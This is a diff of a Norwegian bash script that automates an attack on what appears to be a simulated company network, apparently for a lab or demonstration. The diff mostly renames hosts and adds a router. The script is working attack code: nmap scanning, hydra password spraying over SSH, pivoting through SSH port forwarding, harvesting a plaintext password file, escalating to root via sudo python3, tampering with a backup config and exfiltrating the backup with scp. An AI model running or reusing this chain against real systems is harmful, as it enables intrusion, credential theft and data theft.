@@ -50,7 +50,7 @@ vent_paa_port() {
 # Sti-argumentet er en ferdig formatert streng, f.eks.:
 #   "ATTACKER (*)"
 #   "ATTACKER ──SSH──> PROXY (*)"
-#   "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)"
+#   "ATTACKER ──SSH──> PROXY ──> DRIFTPC (*)"
 # ─────────────────────────────────────────────────────────────────────────────
 
 vis_posisjon() {
@@ -85,19 +85,25 @@ echo "  │  [ ATTACKER       172.20.0.50 ]  (internett)                    │"
 echo "  │        │                                                        │"
 echo "  │        │  :22 SSH / :80 HTTP                                    │"
 echo "  │        ▼                                                        │"
-echo "  │  [ REVERSE-PROXY  172.20.0.10 ] ──── frontend-nett              │"
-echo "  │                   172.21.0.10   ──── backend-nett               │"
+echo "  │  [ EDGE-ROUTER    172.20.0.254 ] ──── frontend-nett             │"
+echo "  │                   172.21.0.253   ──── backend-nett              │"
+echo "  │        │                                                        │"
+echo "  │        ▼                                                        │"
+echo "  │  [ REVERSE-PROXY  172.21.0.10 ] ──── backend-nett               │"
 echo "  │        │                                                        │"
 echo "  │        ├──────────────────────────┐                             │"
 echo "  │        ▼                          ▼                             │"
 echo "  │  [ WEBAPP  172.21.0.20 ]   [ DB  172.21.0.30 ]                  │"
+echo "  │                                                                 │"
+echo "  │  [ DRIFT-PC       172.21.0.40 ] ──── backend-nett               │"
 echo "  │        │                                                        │"
 echo "  │        ▼                                                        │"
-echo "  │  [ ADMINPC        172.21.0.40 ] ──── backend-nett               │"
-echo "  │                   172.22.0.20   ──── internt nett               │"
-echo "  │                   172.23.0.20   ──── backup-nett                │"
+echo "  │  [ ROUTER         172.21.0.254 ] ──── backend-nett              │"
+echo "  │                   172.22.0.254   ──── internt nett              │"
+echo "  │                   172.23.0.254   ──── backup-nett               │"
 echo "  │        │                                                        │"
-echo "  │        ▼                                                        │"
+echo "  │        ├──────────────────────────┐                             │"
+echo "  │        ▼                          ▼                             │"
 echo "  │  [ FILSERVER  172.22.0.10 ]    [ BRUKERPC  172.22.0.30 ]        │"
 echo "  │                                                                 │"
 echo "  │  [ BACKUPSERVER   172.23.0.67 ]                                 │"
@@ -114,14 +120,14 @@ echo "  Mål    : Kartlegge eksponerte tjenester på reverse-proxyen."
 echo "  Verktøy: nmap, netcat"
 echo ""
 
-info "Kjører port-scan mot 172.20.0.10..."
+info "Kjører port-scan mot bedriften.no (172.20.0.254)..."
 echo ""
 
-nmap -sT -p 22,80 172.20.0.10 | grep -v "^Nmap scan report" | grep -v "^Host is up"
+nmap -sT -p 22,80 bedriften.no | grep -v "^Nmap scan report" | grep -v "^Host is up"
 
 echo ""
 info "Henter SSH-banner..."
-SSH_BANNER=$(timeout 3 nc 172.20.0.10 22 2>/dev/null | head -n1)
+SSH_BANNER=$(timeout 3 nc bedriften.no 22 2>/dev/null | head -n1)
 echo "  Banner: $SSH_BANNER"
 echo ""
 
@@ -156,10 +162,10 @@ echo "  │  Vanlige admin-brukernavn og passord –      │"
 echo "  │  typiske standardoppsett i norske systemer. │"
 echo "  └─────────────────────────────────────────────┘"
 echo ""
-info "Kjører password spray mot SSH på 172.20.0.10..."
+info "Kjører password spray mot SSH på bedriften.no..."
 echo ""
 
-RESULT=$(hydra -q -L /workspace/users.txt -P /workspace/passwords.txt ssh://172.20.0.10 -s 22 -t 4 -f 2>/dev/null | grep '\[22\]\[ssh\]')
+RESULT=$(hydra -q -L /workspace/users.txt -P /workspace/passwords.txt ssh://bedriften.no -s 22 -t 4 -f 2>/dev/null | grep '\[22\]\[ssh\]')
 echo "$RESULT"
 
 PROXY_SSH_USER=$(echo "$RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
@@ -180,10 +186,10 @@ pause
 header "FASE 3 – Fotfeste på Proxy og oppsett av SSH-videresending"
 
 vis_posisjon \
-    "ATTACKER ──SSH──> PROXY (*)" \
+    "ATTACKER ──SSH──> EDGE-ROUTER ──> PROXY (*)" \
     "REVERSE-PROXY" \
-    "172.20.0.10 / 172.21.0.10" \
-    "frontend-nett + backend-nett"
+    "172.21.0.10" \
+    "backend-nett (172.21.0.0/24)"
 
 echo "  Mål    : Bruke proxyen som pivot-punkt inn i det interne nettverket."
 echo "  Teknikk: SSH port forwarding"
@@ -195,7 +201,7 @@ run_proxy() {
   sshpass -p "$PROXY_SSH_PASS" ssh \
     -o StrictHostKeyChecking=no \
     -o ConnectTimeout=10 \
-    "$PROXY_SSH_USER@172.20.0.10" "$1"
+    "$PROXY_SSH_USER@bedriften.no" "$1"
 }
 
 setup_tunnel() {
@@ -240,7 +246,7 @@ info "Verifiserer SSH-tilgang til proxy..."
 sshpass -p "$PROXY_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o ConnectTimeout=5 \
-  "$PROXY_SSH_USER@172.20.0.10" "echo SSH_OK" \
+  "$PROXY_SSH_USER@bedriften.no" "echo SSH_OK" \
   || { warn "SSH feilet – avbryter."; exit 1; }
 ok "SSH-tilgang bekreftet."
 sleep 1
@@ -250,7 +256,7 @@ info "Nettverksgrensesnitt på proxy:"
 run_proxy "ip -o -4 addr show" | awk '{print "  " $2 "\t" $4}'
 
 echo ""
-finding "Proxyen ser både frontend-nett (172.20.0.x) og backend-nett (172.21.0.x)."
+finding "Edge-router videresendte SSH til proxyen (172.21.0.10) – proxyen er i backend-nett."
 
 echo ""
 info "Port-scan fra proxy mot interne maskiner..."
@@ -273,29 +279,29 @@ echo ""
 finding "Interne maskiner identifisert:"
 echo "  172.21.0.20 – webapp     (port 5000)"
 echo "  172.21.0.30 – database   (port 5432)"
-echo "  172.21.0.40 – adminpc    (port 22)"
+echo "  172.21.0.40 – drift-pc   (port 22)"
 
 echo ""
-info "Setter opp SSH-videresending til adminpc (172.21.0.40:22 → 127.0.0.1:2223)..."
-setup_tunnel "Videresending" 2223 172.21.0.40 22 172.20.0.10 \
+info "Setter opp SSH-videresending til drift-pc (172.21.0.40:22 → 127.0.0.1:2223)..."
+setup_tunnel "Videresending" 2223 172.21.0.40 22 bedriften.no \
   || { warn "Avbryter – videresending feilet."; exit 1; }
 
 pause
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# FASE 4 – Password spray mot adminpc
+# FASE 4 – Password spray mot drift-pc
 # ─────────────────────────────────────────────────────────────────────────────
 
-header "FASE 4 – Password spray mot AdminPC"
+header "FASE 4 – Password spray mot Drift-PC"
 
 vis_posisjon \
-    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
-    "ADMINPC" \
+    "ATTACKER ──SSH──> EDGE-ROUTER ──> PROXY ──> DRIFT-PC (*)" \
+    "DRIFT-PC" \
     "172.21.0.40" \
     "backend-nett (172.21.0.0/24)"
 
-echo "  Mål    : Finne SSH-passord til bruker på adminpc."
+echo "  Mål    : Finne SSH-passord til bruker på drift-pc."
 echo "  Verktøy: Hydra (127.0.0.1:2223)"
 echo ""
 
@@ -308,87 +314,87 @@ echo "  │  Målrettet liste mot kjente interne         │"
 echo "  │  brukernavn og svake personlige passord.    │"
 echo "  └─────────────────────────────────────────────┘"
 echo ""
-info "Kjører password spray mot adminpc (127.0.0.1:2223)..."
+info "Kjører password spray mot drift-pc (127.0.0.1:2223)..."
 echo ""
 
-ADMINPC_RESULT=$(hydra -q -L /workspace/usersOla.txt \
+DRIFTPC_RESULT=$(hydra -q -L /workspace/usersOla.txt \
   -P /workspace/passwordsOla.txt \
   ssh://127.0.0.1 -s 2223 \
   -t 4 -f 2>/dev/null | grep '\[2223\]\[ssh\]')
-echo "$ADMINPC_RESULT"
+echo "$DRIFTPC_RESULT"
 
-ADMINPC_SSH_USER=$(echo "$ADMINPC_RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
-ADMINPC_SSH_PASS=$(echo "$ADMINPC_RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
+DRIFTPC_SSH_USER=$(echo "$DRIFTPC_RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
+DRIFTPC_SSH_PASS=$(echo "$DRIFTPC_RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
 
 echo ""
-finding "Gyldig konto funnet på adminpc."
-echo "  Brukernavn : $ADMINPC_SSH_USER"
-echo "  Passord    : $ADMINPC_SSH_PASS"
+finding "Gyldig konto funnet på drift-pc."
+echo "  Brukernavn : $DRIFTPC_SSH_USER"
+echo "  Passord    : $DRIFTPC_SSH_PASS"
 
 pause
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# FASE 5 – Rekognosering på adminpc
+# FASE 5 – Rekognosering på drift-pc
 # ─────────────────────────────────────────────────────────────────────────────
 
-header "FASE 5 – Rekognosering på AdminPC"
+header "FASE 5 – Rekognosering på Drift-PC"
 
 vis_posisjon \
-    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
-    "ADMINPC" \
-    "172.21.0.40 / 172.22.0.20 / 172.23.0.20" \
-    "backend-nett + internt nett + backup-nett"
+    "ATTACKER ──SSH──> EDGE-ROUTER ──> PROXY ──> DRIFT-PC (*)" \
+    "DRIFT-PC" \
+    "172.21.0.40" \
+    "backend-nett (172.21.0.0/24)"
 
 echo "  Mål: Kartlegge brukermiljø, nettverkstilknytning og sensitive filer."
 echo ""
 
 info "Brukerinformasjon:"
-sshpass -p "$ADMINPC_SSH_PASS" ssh \
+sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "whoami && id && hostname" | sed 's/^/  /'
 
 echo ""
 info "Nettverksgrensesnitt:"
-sshpass -p "$ADMINPC_SSH_PASS" ssh \
+sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "ip -o -4 addr show | awk '{print \$2, \$4}' | grep -E '172\.'" | sed 's/^/  /'
 
 echo ""
-finding "Adminpc er tilkoblet tre nett: backend, internt og backup."
+finding "Drift-pc har én NIC (backend-nett), men har ruter til internt nett og backup-nett via 172.21.0.254."
 
 echo ""
 info "Filstruktur i hjemmemappe:"
-sshpass -p "$ADMINPC_SSH_PASS" ssh \
+sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "ls -R /home/ola_nordmann" | sed 's/^/  /'
 
 echo ""
 info "Søker etter passordfiler..."
-sshpass -p "$ADMINPC_SSH_PASS" ssh \
+sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "find /home/ola_nordmann -iname '*passord*' -type f 2>/dev/null" | sed 's/^/  /'
 
 echo ""
 info "Innhold i passordfilen:"
 echo ""
-sshpass -p "$ADMINPC_SSH_PASS" ssh \
+sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "cat /home/ola_nordmann/personal/passord.txt" | sed 's/^/  /'
 
 echo ""
@@ -404,8 +410,8 @@ pause
 header "FASE 6 – Lateral movement og Privilege Escalation til root"
 
 vis_posisjon \
-    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
-    "ADMINPC (som drift → root)" \
+    "ATTACKER ──SSH──> EDGE-ROUTER ──> PROXY ──> DRIFT-PC (*)" \
+    "DRIFT-PC (som drift → root)" \
     "172.21.0.40" \
     "backend-nett (172.21.0.0/24)"
 
@@ -413,11 +419,11 @@ echo "  Mål    : Logge inn som drift og eskalere til root via sudo python3."
 echo "  Teknikk: Credential reuse + GTFOBins"
 echo ""
 
-DRIFT_PASSORD=$(sshpass -p "$ADMINPC_SSH_PASS" ssh \
+DRIFT_PASSORD=$(sshpass -p "$DRIFTPC_SSH_PASS" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
-  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
+  -p 2223 "$DRIFTPC_SSH_USER@127.0.0.1" \
   "grep '^drift' /home/ola_nordmann/personal/passord.txt | awk -F'-  ' '{print \$2}'")
 
 DRIFT_B64=$(printf '%s' "$DRIFT_PASSORD" | base64)
@@ -506,7 +512,7 @@ echo "  │  $ROOT_ID"
 echo "  └─────────────────────────────────────────────┘"
 
 echo ""
-finding "Root-tilgang oppnådd på adminpc."
+finding "Root-tilgang oppnådd på drift-pc."
 
 
 PY='import os; os.system("cat /etc/backup.conf")'
@@ -539,10 +545,10 @@ pause
 header "FASE 7 – Manipulering av backup-konfigurasjon"
 
 vis_posisjon \
-    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*) ··> BACKUPSERVER" \
-    "ADMINPC (som root)" \
-    "172.21.0.40 / 172.23.0.20" \
-    "backend-nett + backup-nett"
+    "ATTACKER ──SSH──> EDGE-ROUTER ──> PROXY ──> DRIFT-PC (*) ··> ROUTER ··> BACKUPSERVER" \
+    "DRIFT-PC (som root)" \
+    "172.21.0.40" \
+    "backend-nett (ruter til backup-nett via 172.21.0.254)"
 
 echo "  Mål    : Endre backup.conf slik at neste backup sendes til proxyen."
 echo "  Teknikk: Config tampering som root"
@@ -596,7 +602,7 @@ pause
 header "FASE 8 – Eksfiltrering av sensitive data"
 
 vis_posisjon \
-    "ATTACKER (*) <──SCP── PROXY <··cron··< ADMINPC" \
+    "ATTACKER (*) <--EDGE-ROUTER <──SCP── PROXY <··cron··< DRIFT-PC" \
     "ATTACKER (henter fra proxy)" \
     "172.20.0.50" \
     "internett / frontend-nett (172.20.0.0/24)"
@@ -613,7 +619,7 @@ while true; do
     -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null \
     -o LogLevel=ERROR \
-    "$PROXY_SSH_USER@172.20.0.10" \
+    "$PROXY_SSH_USER@bedriften.no" \
     "test -f /home/webadmin/backup.zip && echo OK")
 
   if [ "$RESULT" = "OK" ]; then
@@ -630,7 +636,7 @@ info "Laster ned backup til angriper..."
 sshpass -p "$PROXY_SSH_PASS" scp \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
-  "$PROXY_SSH_USER@172.20.0.10:/home/webadmin/backup.zip" \
+  "$PROXY_SSH_USER@bedriften.no:/home/webadmin/backup.zip" \
   /root/loot.zip
 
 ok "Eksfiltrering fullført: /root/loot.zip"
